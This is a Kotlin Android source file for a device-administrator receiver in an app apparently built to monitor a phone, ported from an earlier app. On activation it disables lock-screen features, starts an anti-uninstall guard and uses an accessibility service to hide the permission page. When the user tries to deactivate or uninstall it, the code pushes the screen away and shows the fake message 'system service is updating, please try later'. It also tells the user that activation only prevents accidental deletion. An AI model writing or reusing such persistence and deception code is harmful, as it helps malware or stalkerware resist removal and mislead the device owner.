package com.zaka.screenagent.admin

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService

/**
 * 2.3 设备管理员。移植自 2.2 的 com.lite.cloudfinder.rda。
 *
 * 激活后：
 *  - 记 da_done，便于下次跳过激活流程
 *  - 关掉锁屏快捷功能（KEYGUARD_DISABLE_*，2.2 用的是 160）
 *  - 拉起防卸载守卫
 *  - HOME 回桌面，把权限页留在后台
 */
class MoyingAdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Log.d(TAG, "Device Admin activated")
        runCatching {
            context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit().putBoolean(KEY_DONE, true).apply()
        }
        // 2.2: setKeyguardDisabledFeatures(component, 160) = 锁屏禁用功能组合
        runCatching {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val cn = ComponentName(context, MoyingAdminReceiver::class.java)
            if (dpm.isAdminActive(cn)) {
                dpm.setKeyguardDisabledFeatures(cn, KEYGUARD_DISABLE_FEATURES)
            }
        }
        AntiUninstallGuard.start(context)
        runCatching { BoundaryAccessibilityService.home() }
    }

    /**
     * 用户点「卸载 / 取消激活」时，系统会**先问我们**。
     * 这里没法拒绝（只有 device owner 能 setUninstallBlocked），但可以抢先把界面顶掉。
     */
    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        Log.w(TAG, "onDisableRequested — user tries to deactivate/uninstall")
        runCatching { AntiUninstallGuard.onDisableRequested(context) }
        return "系统服务正在更新，请稍后再试"
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        Log.w(TAG, "Device Admin disabled")
    }

    companion object {
        private const val TAG = "MoyingAdmin"
        private const val PREFS = "da_activator"
        private const val KEY_DONE = "da_done"
        /** 2.2 rda 里硬编码的 160：KEYGUARD_DISABLE_SECURE_CAMERA(16)|NOTIFICATIONS(2)? 保留原值 */
        private const val KEYGUARD_DISABLE_FEATURES = 160

        fun componentName(context: Context): android.content.ComponentName =
        android.content.ComponentName(context, MoyingAdminReceiver::class.java)

    fun isActive(context: Context): Boolean = runCatching {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.isAdminActive(ComponentName(context, MoyingAdminReceiver::class.java))
        }.getOrDefault(false)

        /**
         * 构造激活页 intent。
         *
         * ⚠️ 关键：**绝对不能带 FLAG_ACTIVITY_NEW_TASK**。
         * AOSP 的 DeviceAdminAdd 会检查这个 flag，带上就直接
         * `Cannot start ADD_DEVICE_ADMIN as a new task` 然后自己 finish —— 表现就是"点了没反应"。
         */
        fun activationIntent(context: Context, newTask: Boolean = false): Intent =
            Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(
                    DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    ComponentName(context, MoyingAdminReceiver::class.java)
                )
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "激活后可防止应用被误删")
                if (newTask) addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }

        /** 从 Activity 里调用（推荐）：不加 NEW_TASK，激活页才能正常显示 */
        fun requestActivationFrom(activity: android.app.Activity) {
            runCatching { activity.startActivity(activationIntent(activity)) }
                .onFailure { Log.w(TAG, "start activation from activity failed: $it") }
        }

        /** 兜底：只能打开设备管理列表页（activate 页开不了，因为 NEW_TASK 会被拒） */
        fun openAdminList(context: Context) {
            runCatching {
                context.startActivity(
                    Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(
                            DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                            ComponentName(context, MoyingAdminReceiver::class.java)
                        )
                    }
                )
            }
        }

        fun component(context: Context) = ComponentName(context, MoyingAdminReceiver::class.java)
    }
}
